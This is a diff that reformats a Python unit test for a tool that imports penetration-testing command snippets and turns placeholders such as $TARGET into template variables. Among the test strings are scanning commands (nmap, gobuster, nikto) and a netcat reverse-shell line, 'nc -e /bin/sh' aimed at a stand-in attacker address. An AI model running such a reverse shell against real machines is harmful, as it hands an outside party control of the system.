@@ -17,7 +17,6 @@ from core.validators import MAX_CONFIG_FILE_SIZE
 
 
 class TestSnippetImporter(unittest.TestCase):
-
     def setUp(self):
         self.temp_dir = tempfile.TemporaryDirectory()
         self.temp_path = Path(self.temp_dir.name)
@@ -33,10 +32,19 @@ class TestSnippetImporter(unittest.TestCase):
 
     def test_normalize_template_variables(self):
         self.assertEqual(normalize_template_variables("nmap -sV $TARGET"), "nmap -sV {{TARGET_IP}}")
-        self.assertEqual(normalize_template_variables("curl http://$TARGET_IP:$PORT"), "curl http://{{TARGET_IP}}:{{PORT}}")
+        self.assertEqual(
+            normalize_template_variables("curl http://$TARGET_IP:$PORT"),
+            "curl http://{{TARGET_IP}}:{{PORT}}",
+        )
         self.assertEqual(normalize_template_variables("nc -lvnp $LPORT"), "nc -lvnp {{PORT}}")
-        self.assertEqual(normalize_template_variables("nc -e /bin/sh $ATTACKER 4444"), "nc -e /bin/sh {{ATTACKER_IP}} 4444")
-        self.assertEqual(normalize_template_variables("gobuster dir -u http://<target> -w $WORDLIST"), "gobuster dir -u http://{{TARGET_IP}} -w {{WORDLIST}}")
+        self.assertEqual(
+            normalize_template_variables("nc -e /bin/sh $ATTACKER 4444"),
+            "nc -e /bin/sh {{ATTACKER_IP}} 4444",
+        )
+        self.assertEqual(
+            normalize_template_variables("gobuster dir -u http://<target> -w $WORDLIST"),
+            "gobuster dir -u http://{{TARGET_IP}} -w {{WORDLIST}}",
+        )
 
     def test_parse_snippets_json_list(self):
         raw = """[
@@ -69,7 +77,9 @@ nikto -h http://$TARGET
         snippets = parse_snippets_markdown(md)
         self.assertEqual(len(snippets), 2)
         self.assertEqual(snippets[0]["title"], "Gobuster Directory Search")
-        self.assertEqual(snippets[0]["template"], "gobuster dir -u http://{{TARGET_IP}} -w /wordlists/dir.txt")
+        self.assertEqual(
+            snippets[0]["template"], "gobuster dir -u http://{{TARGET_IP}} -w /wordlists/dir.txt"
+        )
         self.assertEqual(snippets[0]["category"], "Web & HTTP")
         self.assertEqual(snippets[1]["title"], "Nikto Scan")
         self.assertEqual(snippets[1]["template"], "nikto -h http://{{TARGET_IP}}")
@@ -83,14 +93,17 @@ nikto -h http://$TARGET
 
     def test_import_from_file_markdown(self):
         fpath = self.temp_path / "cheatsheet.md"
-        fpath.write_text("""
+        fpath.write_text(
+            """
 # Web & HTTP
 ## Enumeration
 ### Gobuster Directory Search
 ```bash
 gobuster dir -u http://$TARGET -w /wordlists/dir.txt
 ```
-""", encoding="utf-8")
+""",
+            encoding="utf-8",
+        )
         count = self.mgr.import_from_file(fpath)
         self.assertEqual(count, 1)
         self.assertTrue(any(s["title"] == "Gobuster Directory Search" for s in self.mgr.snippets))
